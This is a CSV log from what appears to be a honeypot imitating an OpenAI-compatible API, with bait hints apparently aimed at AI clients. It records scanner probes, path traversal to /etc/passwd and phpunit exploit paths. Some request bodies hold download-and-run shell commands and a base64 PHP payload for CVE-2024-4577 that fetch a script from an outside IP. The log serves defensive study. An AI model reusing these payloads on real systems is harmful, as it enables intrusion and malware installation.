request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
a2bb0a12-f3c2-47a0-8404-bd1c76d33b31,2026-04-09T16:33:37.127357+00:00,anon_cc527504,GET,/cgi-bin/luci/;stok=/locale,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9800dda0-f154-4a20-b779-8d5d9ebb774c,2026-04-09T17:12:51.935479+00:00,anon_d9852d19,GET,/sonicui/7/sslvpn-portal/,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e4c9969f-d23e-40fb-bd4f-5d4f055138b3,2026-04-09T17:12:52.159394+00:00,anon_d9852d19,GET,/sslvpnLogin.html,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
0bbea56f-9d8b-4a9c-8e40-9aca44c87182,2026-04-09T17:12:52.395035+00:00,anon_d9852d19,GET,/,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
6ee3d100-6ac5-4a86-bc1d-2f5f36ba1d1c,2026-04-09T17:12:52.635087+00:00,anon_d9852d19,GET,/auth1.html,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
105ef680-8d7f-449e-9285-f64633e9ac4f,2026-04-09T17:12:52.867247+00:00,anon_d9852d19,GET,/auth.html,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
8b20e411-60ea-45dc-b6e8-2f9a11ab1244,2026-04-09T17:12:53.093943+00:00,anon_d9852d19,GET,/api/sonicos/tfa,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
0c05e066-3e56-44ef-9739-71331d9ec201,2026-04-09T17:12:53.325962+00:00,anon_d9852d19,GET,/api/sonicos/auth,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9ad4692e-f089-43f1-9676-80e7b8d2b140,2026-04-09T17:37:08.382170+00:00,anon_445a1987,POST,/cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
bb9bd509-19a8-47e0-bd5b-911de7d24707,2026-04-09T17:43:23.371884+00:00,anon_1ea754dc,GET,/,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
60a1df14-f5f5-4864-8f23-4cbd36156b40,2026-04-09T18:11:05.088922+00:00,anon_f334d8af,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
107a2d1f-e311-4a1a-b679-a9414663a124,2026-04-09T18:20:35.258731+00:00,anon_d3ba50ad,GET,/,[honeypot-host],visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
46b70f84-fd71-4297-bfe1-da49b7e219b0,2026-04-09T18:21:24.492971+00:00,anon_d3ba50ad,GET,/,[honeypot-host],visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
2aceda54-41e1-4b25-9fbe-74b7f8a8f5cc,2026-04-09T18:29:47.553238+00:00,anon_fa0f7a3d,GET,/..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,[honeypot-host],Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e46d48e1-1855-4015-bcb4-ddff977d6d21,2026-04-09T18:36:18.108898+00:00,anon_bf8e44f7,GET,/,[honeypot-host],,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
c6caaba2-6552-4492-9d12-d79a2943d249,2026-04-09T19:48:26.296641+00:00,anon_28c15fd8,GET,/.env,[honeypot-host],"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9ae9d5b6-6292-4f15-abf9-b0f8613cebe8,2026-04-09T19:48:26.553733+00:00,anon_28c15fd8,POST,/,[honeypot-host],"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,20,316,1,,0x%5B%5D=androxgh0st,0x%5B%5D=androxgh0st,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
094f00ff-a281-4bed-aa41-ff469f6d82cc,2026-04-09T19:48:41.962923+00:00,anon_e8ebe974,GET,/,[honeypot-host],"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
9da4f950-9daa-4d81-a0c6-8f6390e93149,2026-04-09T20:04:40.325059+00:00,anon_3f434375,GET,/,[honeypot-host],Mozilla/5.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
26a143ad-7cf1-44c1-a8be-dde08cd446b1,2026-04-09T20:24:44.758323+00:00,anon_bcac5d63,GET,/,[honeypot-host],Go-http-client/1.1,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
679d468a-9f8a-4141-a6bc-6fdd5707d2c2,2026-04-09T21:49:01.353318+00:00,anon_e23631ed,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,[honeypot-host],libredtail-http,,119,316,1,,(wget --no-check-certificate -qO- https://46.151.182.82/sh || curl -sk https://46.151.182.82/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://46.151.182.82/sh || curl -sk https://46.151.182.82/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9496d13f-8046-4352-8ff7-56f5803766c1,2026-04-09T21:49:01.703498+00:00,anon_e23631ed,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,[honeypot-host],libredtail-http,,119,316,1,,(wget --no-check-certificate -qO- https://46.151.182.82/sh || curl -sk https://46.151.182.82/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://46.151.182.82/sh || curl -sk https://46.151.182.82/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
2c79cf9e-5532-4b16-9dc7-50131e9fa757,2026-04-09T21:49:02.055279+00:00,anon_e23631ed,POST,/hello.world,[honeypot-host],libredtail-http,,241,316,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vNDYuMTUxLjE4Mi44Mi9zaCB8fCBjdXJsIC1zayBodHRwczovLzQ2LjE1MS4xODIuODIvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vNDYuMTUxLjE4Mi44Mi9zaCB8fCBjdXJsIC1zayBodHRwczovLzQ2LjE1MS4xODIuODIvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
96415b84-e3ef-4c0d-8302-bc1236d15acb,2026-04-09T21:49:02.491490+00:00,anon_e23631ed,POST,/,[honeypot-host],libredtail-http,,241,316,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vNDYuMTUxLjE4Mi44Mi9zaCB8fCBjdXJsIC1zayBodHRwczovLzQ2LjE1MS4xODIuODIvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vNDYuMTUxLjE4Mi44Mi9zaCB8fCBjdXJsIC1zayBodHRwczovLzQ2LjE1MS4xODIuODIvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d6851825-ea8e-461c-a686-798eb6740da3,2026-04-09T21:49:02.905997+00:00,anon_e23631ed,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
93518fca-3eed-4a09-9035-c87af6fecba7,2026-04-09T21:49:03.309247+00:00,anon_e23631ed,GET,/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
7daee5ea-c5f1-4fd4-b2e0-6b966fd01297,2026-04-09T21:49:03.720812+00:00,anon_e23631ed,GET,/vendor/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
40f7e677-652f-4da2-bda6-77786cbf1441,2026-04-09T21:49:04.162604+00:00,anon_e23631ed,GET,/vendor/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
33865e6f-c4de-4016-8a3e-16fe2d738032,2026-04-09T21:49:04.567514+00:00,anon_e23631ed,GET,/vendor/phpunit/phpunit/LICENSE/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
b7bfb94a-5712-491e-a7c3-e012815d614a,2026-04-09T21:49:04.970436+00:00,anon_e23631ed,GET,/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
4ed013dc-0f20-4377-a280-ffcd43acaa17,2026-04-09T21:49:05.384591+00:00,anon_e23631ed,GET,/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c4ba0035-f360-48af-99c1-8a448146fa9d,2026-04-09T21:49:05.752265+00:00,anon_e23631ed,GET,/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
dc6897b6-5b38-4a24-85bb-f07778793a10,2026-04-09T21:49:06.140957+00:00,anon_e23631ed,GET,/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d57112da-440e-4416-b878-51be95550010,2026-04-09T21:49:06.541769+00:00,anon_e23631ed,GET,/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a7e3afca-77dc-472e-9734-e0327cf448db,2026-04-09T21:49:06.894640+00:00,anon_e23631ed,GET,/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e5cecfbc-c0de-4419-a4b0-e745523f33ef,2026-04-09T21:49:07.258162+00:00,anon_e23631ed,GET,/lib/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
f10744ea-8753-40c5-90c1-ab367304734d,2026-04-09T21:49:07.640318+00:00,anon_e23631ed,GET,/lib/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
98b690e1-4553-4a55-8d4f-8d146920fb06,2026-04-09T21:49:08.005700+00:00,anon_e23631ed,GET,/lib/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
345da78d-5dc3-41d9-a7de-8b7ae38513d4,2026-04-09T21:49:08.392800+00:00,anon_e23631ed,GET,/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
798853ca-d729-451e-a5b0-ef358c8ae743,2026-04-09T21:49:08.803469+00:00,anon_e23631ed,GET,/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
1a69f0d2-70f9-4b3d-b70c-b71f3bd13eb9,2026-04-09T21:49:09.253989+00:00,anon_e23631ed,GET,/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
2d3258a5-efb1-47ee-94e8-16ecee61e33d,2026-04-09T21:49:09.689629+00:00,anon_e23631ed,GET,/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e5ada4e1-6cc9-41db-84aa-915e93d5254e,2026-04-09T21:49:10.071850+00:00,anon_e23631ed,GET,/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
718a1f52-3f70-472d-94c0-e0ccca0ec764,2026-04-09T21:49:10.509968+00:00,anon_e23631ed,GET,/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
0ce2a406-006b-4338-9ead-463613fa4d63,2026-04-09T21:49:10.933163+00:00,anon_e23631ed,GET,/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e6575a27-795f-443c-9396-bb962d0c72cb,2026-04-09T21:49:11.276709+00:00,anon_e23631ed,GET,/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a8bf20e6-093a-4db1-a506-63fb10b4e87b,2026-04-09T21:49:11.668680+00:00,anon_e23631ed,GET,/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
